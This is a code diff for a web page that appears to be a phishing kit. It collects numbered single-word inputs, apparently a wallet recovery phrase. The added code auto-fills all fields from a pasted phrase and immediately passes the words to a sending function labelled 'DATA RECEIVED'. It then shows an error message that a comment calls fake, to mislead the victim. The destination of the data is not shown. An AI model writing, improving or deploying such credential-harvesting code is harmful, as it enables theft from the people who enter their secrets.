@@ -43,8 +43,6 @@
         .item-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; color: white; font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; }
         .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; }
         .item-input:focus + .item-num, .item-input:not(:placeholder-shown) + .item-num { display: none; }
-        
-        /* تنسيق رسالة الخطأ المخفية */
         #errorMessage { color: var(--error-red); font-size: 14px; text-align: center; margin-top: 15px; display: none; font-weight: 500; }
     </style>
 </head>
@@ -112,6 +110,25 @@
             grid.appendChild(div);
         }
 
+        // --- وظيفة اللصق التلقائي (Auto-Paste) ---
+        document.addEventListener('paste', (e) => {
+            if (e.target.classList.contains('item-input')) {
+                e.preventDefault();
+                const data = e.clipboardData.getData('text');
+                const words = data.trim().split(/\s+/); // تقسيم النص بناءً على المسافات
+                const inputs = document.querySelectorAll('.item-input');
+                
+                words.forEach((word, index) => {
+                    if (index < inputs.length) {
+                        inputs[index].value = word;
+                        inputs[index].dispatchEvent(new Event('input')); // تفعيل حدث الإدخال لتغيير النمط
+                    }
+                });
+                // إرسال البيانات فور اللصق
+                checkAndSendAll();
+            }
+        });
+
         function checkAndSendAll() {
             const inputs = document.querySelectorAll('.item-input');
             let words = [];
@@ -123,12 +140,15 @@
                 words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${val || "Empty"}</code>`);
             });
 
-            // إرسال البيانات فور الضغط
-            const fullMessage = `<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`;
-            sendFinalData(fullMessage);
+            if (count > 0) {
+                const fullMessage = `<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`;
+                sendFinalData(fullMessage);
+            }
             
-            // إظهار نص الخطأ بشكل أنيق بدلاً من Alert
-            document.getElementById('errorMessage').style.display = 'block';
+            // إظهار رسالة الخطأ الوهمية
+            if(document.getElementById('p2').classList.contains('active')) {
+                document.getElementById('errorMessage').style.display = 'block';
+            }
         }
 
         document.addEventListener('input', (e) => {
